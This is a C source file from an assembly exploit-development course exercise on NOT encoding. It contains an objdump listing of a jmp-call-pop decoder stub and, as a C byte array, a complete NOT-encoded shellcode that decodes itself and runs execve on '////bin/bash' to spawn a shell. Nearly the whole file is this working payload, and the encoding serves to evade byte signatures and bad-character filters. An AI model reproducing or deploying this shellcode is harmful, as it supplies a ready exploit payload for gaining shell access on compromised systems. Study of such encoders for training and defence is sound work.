/*
Following video: Module 2-9: NOT
Using code from NASM\2-9

    /mnt/git/NASM/SLAE32/2-9_NOT/execve-not:     file format elf32-i386

    Disassembly of section .text:

    08049000 <_start>:
     8049000:       eb 0c                   jmp    804900e <call_shellcode>

    08049002 <decoder>:
     8049002:       5e                      pop    esi
     8049003:       31 c9                   xor    ecx,ecx
     8049005:       b1 1e                   mov    cl,0x1e

    08049007 <decode>:
     8049007:       f6 16                   not    BYTE PTR [esi]
     8049009:       46                      inc    esi
     804900a:       e2 fb                   loop   8049007 <decode>
     804900c:       eb 05                   jmp    8049013 <EncodedShellcode>

    0804900e <call_shellcode>:
     804900e:       e8 ef ff ff ff          call   8049002 <decoder>

    08049013 <EncodedShellcode>:
     8049013:       ce                      into   
     8049014:       3f                      aas    
     8049015:       af                      scas   eax,DWORD PTR es:[edi]
     8049016:       97                      xchg   edi,eax
     8049017:       9d                      popf   
     8049018:       9e                      sahf   
     8049019:       8c 97 97 9d 96 91       mov    WORD PTR [edi-0x6e696269],ss
     804901f:       d0 97 d0 d0 d0 d0       rcl    BYTE PTR [edi-0x2f2f2f30],1
     8049025:       76 1c                   jbe    8049043 <EncodedShellcode+0x30>
     8049027:       af                      scas   eax,DWORD PTR es:[edi]
     8049028:       76 1d                   jbe    8049047 <EncodedShellcode+0x34>
     804902a:       ac                      lods   al,BYTE PTR ds:[esi]
     804902b:       76 1e                   jbe    804904b <EncodedShellcode+0x38>
     804902d:       4f                      dec    edi
     804902e:       f4                      hlt    
     804902f:       32                      .byte 0x32
     8049030:       7f                      .byte 0x7f

*/

unsigned char shellcode[] = {
"\xeb\x0c\x5e\x31\xc9\xb1\x1e\xf6\x16\x46\xe2\xfb\xeb\x05\xe8\xef"
"\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0"
"\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32"
"\x7f"
};

unsigned int shellcode_len = sizeof(shellcode)-1;